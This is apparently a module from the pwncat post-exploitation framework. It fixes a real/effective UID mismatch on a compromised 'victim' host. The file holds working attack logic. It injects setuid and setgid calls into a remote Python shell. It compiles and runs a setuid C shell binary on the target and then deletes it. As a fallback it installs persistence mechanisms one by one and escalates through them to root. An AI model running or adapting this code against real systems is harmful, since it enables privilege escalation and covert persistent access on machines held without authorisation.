#!/usr/bin/env python3
"""
Provide the capability to manually fix a situation where your real and
effective UID do not match. This command attempts a few different methods
to correct the mismatch, ending with attempting to install a persistence
method and then escalate manually back into root to gain EUID==UID==0.
"""
from io import StringIO
import textwrap
import time

from rich.progress import Progress, BarColumn, TimeRemainingColumn

from pwncat.commands.base import CommandDefinition
from pwncat.persist import PersistenceError
from pwncat.util import console, CompilationError
import pwncat


class Command(CommandDefinition):
    """ Check for and attempt to automatically correct an EUID/UID
    mismatch. This usually happens after a manual privilege escaltion
    with a SUID binary. This command will first attempt to use a few
    scripting methods to change the real UID (currently only python
    if available) and then attempt to compile a binary for the remote
    system which will set the real UID. If the scripting and compiled
    methods fail, the command will try to install each persistence
    method in order until one successfully provides access w/ EUID=UID=0.
    """

    PROG = "euid_fix"
    ARGS = {}
    DEFAULTS = {}
    LOCAL = False

    def run(self, args):

        ident = pwncat.victim.id

        # Check that UID != EUID
        if ident["uid"]["id"] == ident["euid"]["id"]:
            console.log("no euid/uid mismatch detected")
            return

        with Progress(
            "euid/uid fix",
            "•",
            "[progress.description]{task.fields[status]}",
            transient=True,
        ) as progress:

            task = progress.add_task("", status="initializing")

            # First try to escalate with python. This removes the need
            # for any system modifications. Which will resolve a variety
            # of python verions including "python2" and "python3".
            python = pwncat.victim.which("python")
            if python is not None:
                progress.update(
                    task, status="attempting [yellow]python-based[/yellow] fix"
                )
                pwncat.victim.run(python, wait=False)
                pwncat.victim.client.send(b"import os\n")
                pwncat.victim.client.send(
                    f"os.setuid({ident['euid']['id']})\n".encode("utf-8")
                )
                pwncat.victim.client.send(
                    f"os.setgid({ident['egid']['id']})\n".encode("utf-8")
                )
                pwncat.victim.client.send(
                    f'os.system("{pwncat.victim.shell}")\n'.encode("utf-8")
                )
                time.sleep(0.5)

                new_ident = pwncat.victim.id
                if (
                    new_ident["uid"]["id"] == new_ident["euid"]["id"]
                    and new_ident["uid"]["id"] == ident["euid"]["id"]
                ):
                    progress.log(
                        "euid/uid [green]corrected[/green] via [yellow]python-based[/yellow] fix!"
                    )
                    pwncat.victim.reset(hard=False)
                    return

                pwncat.victim.run("exit", wait=False)
                pwncat.victim.client.send(b"quit()\n")
                time.sleep(0.1)

            # Quick and simple UID=EUID fix
            fix_source = textwrap.dedent(
                f"""
                #include <stdio.h>

                int main(int argc, char** argv) {{
                    setuid({ident["euid"]["id"]});
                    setgid({ident["egid"]["id"]});
                    execl("{pwncat.victim.shell}", "{pwncat.victim.shell}", NULL);
                }}
            """
            )

            # See if we can compile it
            try:
                progress.update(task, status="attempting [yellow]c-based[/yellow] fix")
                remote_binary = pwncat.victim.compile([StringIO(fix_source)])
                # Appears to have went well, try to execute
                pwncat.victim.run(remote_binary, wait=False)

                # Give it some time to catch up
                time.sleep(0.5)

                # Remove the binary
                pwncat.victim.env(["rm", "-f", remote_binary])

                new_ident = pwncat.victim.id
                if (
                    new_ident["uid"]["id"] == new_ident["euid"]["id"]
                    and new_ident["uid"]["id"] == ident["euid"]["id"]
                ):
                    progress.log("euid/uid corrected via [yellow]c-based[/yellow] fix!")
                    pwncat.victim.reset(hard=False)
                    return

                pwncat.victim.run("exit", wait=False)
            except CompilationError:
                pass

            # Installation/removal of privilege escalation methods can take time,
            # so we start a progress bar.
            methods = list(pwncat.victim.persist.available)
            for method in methods:

                if ident["euid"]["id"] != 0 and method.system:
                    continue

                progress.update(
                    task, status=f"installing [yellow]{method.name}[/yellow]",
                )

                # Depending on the method type, we may need to specify a user
                if method.system:
                    user = None
                elif ident["euid"]["id"] != 0:
                    user = ident["euid"]["name"]
                else:
                    user = "root"

                try:
                    # Attempt to install
                    pwncat.victim.persist.install(method.name, user)
                except PersistenceError:
                    # This one failed :( try another
                    continue

                try:
                    # Install succeeded, attempt to escalate
                    progress.update(
                        task, status=f"[yellow]{method.name}[/yellow] installed"
                    )
                    method.escalate(user)
                    pwncat.victim.reset(hard=False)
                    progress.update(
                        task,
                        status=f"[yellow]{method.name}[/yellow] succeeded!",
                        completed=len(methods),
                    )
                    progress.log(
                        f"euid/uid [green]corrected[/green] via [yellow]{method.name}[/yellow]!"
                    )
                    break
                except PersistenceError:
                    # Escalation failed, remove persistence :(
                    pwncat.victim.persist.remove(method.name, user)
            else:
                progress.log("[red]error[/red]: euid/uid fix failed")
